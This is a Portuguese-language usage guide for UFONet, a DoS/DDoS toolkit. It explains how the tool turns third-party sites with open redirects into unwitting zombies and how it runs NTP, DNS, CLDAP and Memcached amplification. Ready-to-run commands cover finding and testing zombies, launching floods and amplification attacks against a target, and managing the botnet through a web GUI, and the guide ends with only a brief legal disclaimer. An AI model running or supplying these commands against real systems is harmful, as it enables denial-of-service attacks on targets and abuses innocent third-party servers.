# UFONet — Disruptive Toolkit (DoS/DDoS + DarkNET)

## Como funciona

UFONet é uma das ferramentas mais complexas da lista. Funciona em duas frentes:

**1. DoS/DDoS via Open Redirects (Layer 7):**
- Explora vetores de Open Redirect (CWE-601) em sites de terceiros para usá-los como "zumbis" involuntários
- Os zumbis fazem requisições ao alvo sem que o atacante se exponha diretamente
- Suporta amplificação via CHARGEN, NTP, DNS, CLDAP, Memcached, MSSQL, NetBIOS, etc.

**2. DarkNET P2P criptografada:**
- Cria uma rede cliente/servidor P2P para publicar e receber conteúdo anonimamente
- Comunicação criptografada entre nós

**Camadas suportadas:**
- Layer 3: amplificação de protocolos (NTP, DNS, CLDAP, Memcached...)
- Layer 7: HTTP flood via Open Redirects, botnet de zumbis

## Dependências

```bash
pip install requests
# Interface web (opcional):
pip install flask
```

## Como instalar

```bash
cd ufonet/
pip install requests
# Opcional para GUI web:
pip install flask
```

## Como usar

```bash
# Ver ajuda completa
python3 ufonet --help

# Buscar zumbis (Open Redirects) automaticamente
python3 ufonet --search-zombies

# Testar zumbis disponíveis
python3 ufonet --test-zombies

# Atacar um alvo com os zumbis disponíveis
python3 ufonet --attack http://192.168.1.100

# Iniciar interface web (GUI no browser)
python3 ufonet --gui
# Acesse: http://127.0.0.1:9999

# Ver estatísticas da botnet
python3 ufonet --botnet-stats

# Amplificação NTP
python3 ufonet --ntp-attack 192.168.1.100

# Amplificação DNS
python3 ufonet --dns-attack 192.168.1.100
```

## Estrutura do projeto

```
ufonet/
├── ufonet               # Script principal (executável)
├── setup.py
└── botnet/
    ├── aliens.txt       # Lista de zumbis conhecidos
    ├── ntp.txt          # Servidores NTP para amplificação
    ├── dns.txt          # Servidores DNS para amplificação
    ├── memcached.txt    # Servidores Memcached expostos
    ├── cldap.txt        # Servidores CLDAP
    └── dorks.txt        # Dorks para buscar Open Redirects
```

## Interface Web

UFONet tem uma GUI web completa:

```bash
python3 ufonet --gui
```

Acesse `http://127.0.0.1:9999` no browser. A interface permite:
- Gerenciar zumbis
- Configurar ataques
- Ver estatísticas em tempo real
- Acessar a DarkNET P2P

## Notas

- Os arquivos em `botnet/` podem estar desatualizados — os zumbis/servidores listados podem não estar mais ativos
- A busca automática de zumbis (`--search-zombies`) usa dorks do Google/Bing
- Amplificação L3 requer que os servidores listados ainda estejam expostos

## ⚠️ Aviso Legal

Use **somente em ambientes que você tem autorização**. UFONet é uma ferramenta de pesquisa de segurança — usar contra sistemas de terceiros é crime.
